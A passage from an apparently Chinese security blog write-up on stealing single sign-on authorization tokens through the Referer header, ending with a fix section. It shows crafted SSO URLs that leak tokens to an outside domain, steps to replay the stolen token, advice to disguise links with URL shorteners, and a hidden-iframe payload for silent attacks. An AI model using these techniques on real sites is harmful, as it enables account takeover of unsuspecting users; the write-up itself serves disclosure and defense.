src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/9_UYibe3GosHJHV9iaPPfmz076eA6upA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPoSZYrQCcLkgM5kZjoeaFQk2KsNUYibe3GosHJHV9iaPPfmz076eA6upA/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">获取到auth等参数的值<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">auth=yyyy&amp;isiframe=1&amp;location= 687474703a2f2f7777772e4242422e636f6d2f</code></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后在浏览器的新建隐身窗口中打开如下链接：</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">http://www.BBB.com/sso/loginPc?auth=yyyy&amp;isiframe=1&amp;location=687474703a2f2f7777772e4242422e636f6d2f<br  /></code></pre><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.67109375" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/10_HqEjqr0B7KY4gyF2wP0yoCzcfvlYJA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPyp7BPqjd7pMAPWEw9PQaMdibSHqEjqr0B7KY4gyF2wP0yoCzcfvlYJA/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">这时候已经授权完，但是页面会在那一直重复刷新，没关系，我们这时候重新请求<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://www.BBB.com/main.htm</code></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.3921875" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/11_jTSibnk4xyjnPk35vJEdgcEtWCa6BA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGP0YwEnUcGTYDFtdVTCDvfBaeLRjTSibnk4xyjnPk35vJEdgcEtWCa6BA/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">发现我们已经登录进该网站</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">但是，但是，但是，如果你去访问<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://members.BBB.com</code>&nbsp;会显示你还未登录</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">所以我们可以用下面的方法继续</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">请求如下链接：</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">https://passport.AAA.com/sso/accounts/serviceLogin?continue=http://bbs.subdomain.AAA.com/thread-942592-1-1.html?&amp;isiframe=1&amp;service=service_id&amp;location=687474703a2f2f7777772e4242422e636f6d2f<br  /></code></pre><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">continue</code>还是指向帖子，<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">location</code>为<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://members.BBB.com/</code></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.64765625" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/12_tkaJqhiazApYibdee6ODo21jynyIIQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPZGEL1RMnIQpoc7WV2ny2iajxPdrtkaJqhiazApYibdee6ODo21jynyIIQ/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">通过referer，网站成功获得&nbsp;<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">auth=zzzz&amp;isiframe=1&amp;location=687474703a2f2f7777772e4242422e636f6d2f</code>&nbsp;在新建隐身窗口中打开如下链接：</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">http://members.BBB.com/SSOServerLogin?auth=zzzz&amp;isiframe=1&amp;location=687474703a2f2f7777772e4242422e636f6d2f<br  /></code></pre><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.67890625" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/13_KNT5spNaIOkzy6JgsqOZocicj8KaQw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPibxiapos7ThtfAXZnrx9VALnJVTKNT5spNaIOkzy6JgsqOZocicj8KaQw/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.46484375" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/14_f57GlKjF47Ef0oUa3a7TUEKXq793mQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGP0eA6qKu1JziaicQNO0XsNelwPFf57GlKjF47Ef0oUa3a7TUEKXq793mQ/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">登录用户中心成功！<br  /></p><h5 style="font-weight: 600;line-height: 1.7;font-size: 1.15rem;margin-top: 0.575rem;margin-bottom: 0.46rem;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>【3】</strong></h5><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在未登录<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">https://passport.AAA.com/</code>的情况下 实际上和上面的也没差别，链接还是一样，只是当下要你马上登录而已</p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.2015625" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/15_o9cC1RqfoK0RcfAwWPhTTNeibNqD8w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPkE4dPAxuicXLDx6EpJXtwrrHVZo9cC1RqfoK0RcfAwWPhTTNeibNqD8w/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">登录后还是会跳转到那个帖子，然后通过referer传递数据 这种情况下链接可能比较长，那么可以通过短链接来进行伪装</p><h5 style="font-weight: 600;line-height: 1.7;font-size: 1.15rem;margin-top: 0.575rem;margin-bottom: 0.46rem;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>【4】更好的利用漏洞</strong></h5><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">(1)子域名下有很多bbs站点，那么去论坛上发帖，然后把链接弄成短链接，如果是已经登录的用户就直接中招了，如果是未登录的用户，那么他点了链接之后登录也会中招。(2)对于攻击已登录的用户，还有一个更好的办法，那么就是像利用csrf一样，在自己的网站直接用隐藏的iframe请求，用户无声无息就中招了</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">&lt;iframe  id=kk src= "https://passport.AAA.com/sso/accounts/serviceLogin?continue=http:// bbs.subdomain.AAA.com/thread-942592-1-1.html&amp;isiframe=1&amp;service=service_id&amp;location=687474703a2f2f7777772e4242422e636f6d2f&amp;CSSStyle=https://static.xxx.AAA.com/sso/subdomain/style/login_t_cover160316.css" border= "1" frameborder= "1 "  width= "100 " height= "100 " style= "display:none "&gt; &lt;/iframe&gt;<br  /></code></pre><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.728125" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/16_Snm92Ep4kWt0SDIGTdOpLWNn1TTqpA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGP8SUC6l9mxNEMQwRSMleGRb62Snm92Ep4kWt0SDIGTdOpLWNn1TTqpA/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><h4 style="font-weight: 600;line-height: 1.7;font-size: 1.25rem;margin-top: 0.625rem;margin-bottom: 0.5rem;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>修复方案：</strong><br  /></h4><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">可以在后端直接就指定了<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">service</code>对应的地址，所以你在请求时无论改什么，最后授权都是返回指定的网站。另外一个的话，论坛最好还是不要允许直接插入外链，每个网站在对外发起请求时最好有一个中转站点用来脱敏，可以参考qq邮箱或者知乎的外链脱敏方法。</p><p style="white-space: normal;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);"><img data-type="png" class="" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/17_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="letter-spacing: 0.544px;text-align: right;color: rgb(0, 0, 0);font-size:14px;line-height:34px;;visibility: visible !important;width: 640px !important;"  /></p><p style="white-space: normal;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);text-align: center;"><br  /></p><p style="white-space: normal;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);"><br  /></p><p style="white-space: normal;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);text-align: right;"><span style="font-size:12px;line-height:32px;;">作者:&nbsp;tdaro</span></p><p style="white-space: normal;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);text-align: right;"><span style="font-size:12px;line-height:32px;;">博客地址:&nbsp;https://b.cp0.win/</span></p><p style="white-space: normal;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);text-align: right;"><span style="font-size:12px;line-height:32px;;">参考来源: <span style="font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size:12px;line-height:32px;;letter-spacing: 0.544px;text-align: right;background-color: rgb(255, 255, 255);">tdaro</span>的Blog</span></p><p style="white-space: normal;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);"><img class="rich_pages __bg_gif " data-ratio="0.5197505197505198" data-type="gif" data-w="962" data-backw="574" data-backh="299" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/18_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" style="visibility: visible !important;width: 677px !important;"  /></p>
                </div>
</div>
</body>
</html>